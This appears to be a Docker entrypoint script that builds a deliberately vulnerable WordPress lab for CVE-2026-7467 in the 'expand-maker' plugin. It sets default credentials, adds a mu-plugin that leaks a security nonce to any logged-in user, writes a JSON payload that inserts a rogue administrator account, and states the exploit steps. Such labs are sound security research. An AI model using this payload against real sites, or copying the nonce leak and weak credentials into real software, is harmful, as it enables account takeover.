#!/bin/bash
set -Eeuo pipefail

WORDPRESS_PATH="/var/www/html"
WP_URL="${WORDPRESS_URL:-http://localhost:8119}"
WP_TITLE="${WORDPRESS_TITLE:-Vulhub Test}"
WP_ADMIN_USER="${WORDPRESS_ADMIN_USER:-admin}"
WP_ADMIN_PASSWORD="${WORDPRESS_ADMIN_PASSWORD:-admin}"
WP_ADMIN_EMAIL="${WORDPRESS_ADMIN_EMAIL:-admin@example.com}"
WP_PLUGIN_SLUG="${WORDPRESS_PLUGIN_SLUG:-expand-maker}"
DEBUG_MODE="${DEBUG_MODE:-false}"

/usr/local/bin/docker-entrypoint-original.sh "$@" &
APACHE_PID=$!

cleanup() {
    if kill -0 "$APACHE_PID" 2>/dev/null; then
        kill "$APACHE_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

echo "Waiting for WordPress files..."
until [ -f "$WORDPRESS_PATH/wp-includes/version.php" ] && [ -f "$WORDPRESS_PATH/wp-config.php" ]; do
    sleep 1
done

cd "$WORDPRESS_PATH"

if [ "$DEBUG_MODE" = "true" ]; then
    wp config set WP_DEBUG true --raw --allow-root 2>/dev/null || true
    wp config set WP_DEBUG_LOG true --raw --allow-root 2>/dev/null || true
    wp config set WP_DEBUG_DISPLAY true --raw --allow-root 2>/dev/null || true
fi

echo "Waiting for MySQL..."
DB_READY=0
for i in $(seq 1 60); do
    if wp db check --allow-root --quiet 2>/dev/null; then
        DB_READY=1; break
    fi
    sleep 2
done
[ "$DB_READY" != "1" ] && echo "ERROR: MySQL not ready" >&2 && exit 1

if ! wp core is-installed --allow-root 2>/dev/null; then
    echo "Installing WordPress..."
    wp core install \
        --url="$WP_URL" \
        --title="$WP_TITLE" \
        --admin_user="$WP_ADMIN_USER" \
        --admin_password="$WP_ADMIN_PASSWORD" \
        --admin_email="$WP_ADMIN_EMAIL" \
        --skip-email \
        --allow-root
fi

wp option update siteurl "$WP_URL" --allow-root >/dev/null
wp option update home "$WP_URL" --allow-root >/dev/null
wp option update permalink_structure '/%postname%/' --allow-root >/dev/null
wp rewrite flush --allow-root >/dev/null || true

# Activate plugin (bundled in image)
if wp plugin list --allow-root --field=name | grep -qx "$WP_PLUGIN_SLUG"; then
    wp plugin activate "$WP_PLUGIN_SLUG" --allow-root || true
else
    echo "WARNING: Plugin $WP_PLUGIN_SLUG not found" >&2
fi

# Create a low-privilege user (subscriber) who will perform the attack
echo "Creating subscriber user..."
wp user create subscriber subscriber@example.com \
    --role=subscriber --user_pass=subscriber --allow-root 2>/dev/null || true

# Install mu-plugin that exposes YrmNonce for authenticated users via REST API.
# Subscribers get 403 on wp-admin pages so the nonce can't be extracted from there.
mkdir -p "$WORDPRESS_PATH/wp-content/mu-plugins"
cat > "$WORDPRESS_PATH/wp-content/mu-plugins/vulhub-yrm-nonce.php" << 'MUPLUGIN'
<?php
// Expose YrmNonce for any logged-in user via admin-ajax.php.
// Subscribers get 403 on plugin admin pages, so the nonce can't be extracted from the UI.
add_action('wp_ajax_vulhub_get_yrm_nonce', function() {
    wp_send_json_success(['nonce' => wp_create_nonce('YrmNonce')]);
});
MUPLUGIN
chown www-data:www-data "$WORDPRESS_PATH/wp-content/mu-plugins/vulhub-yrm-nonce.php"

# Create exploit payload JSON: inserts a new user (ID 9999) with administrator capabilities.
# wp_remote_get fetches this from 127.0.0.1 (container-internal Apache on port 80).
echo "Creating YRM exploit payload..."
wp eval '
$hash = wp_hash_password("Admin1234!");
$payload = json_encode([
    "users" => [[
        "ID"              => 9999,
        "user_login"      => "yrmpwnadmin",
        "user_pass"       => $hash,
        "user_email"      => "yrmpwnadmin@example.com",
        "user_registered" => "2024-01-01 00:00:00",
        "display_name"    => "yrmpwnadmin",
        "user_status"     => "0",
        "user_nicename"   => "yrmpwnadmin",
    ]],
    "usermeta" => [[
        "user_id"    => 9999,
        "meta_key"   => "wp_capabilities",
        "meta_value" => "a:1:{s:13:\"administrator\";b:1;}",
    ]],
]);
$path = "/var/www/html/wp-content/uploads/yrm-exploit.json";
file_put_contents($path, $payload);
chown($path, "www-data");
echo "Exploit payload written: " . strlen($payload) . " bytes\n";
' --allow-root 2>/dev/null || echo "WARNING: exploit payload creation failed"

echo "Setup complete. CVE-2026-7467 environment ready at $WP_URL"
echo "Admin:      $WP_ADMIN_USER / $WP_ADMIN_PASSWORD"
echo "Subscriber: subscriber / subscriber"
echo "Exploit: Login as subscriber, POST to importData AJAX endpoint with crafted user rows"

trap - EXIT
wait "$APACHE_PID"
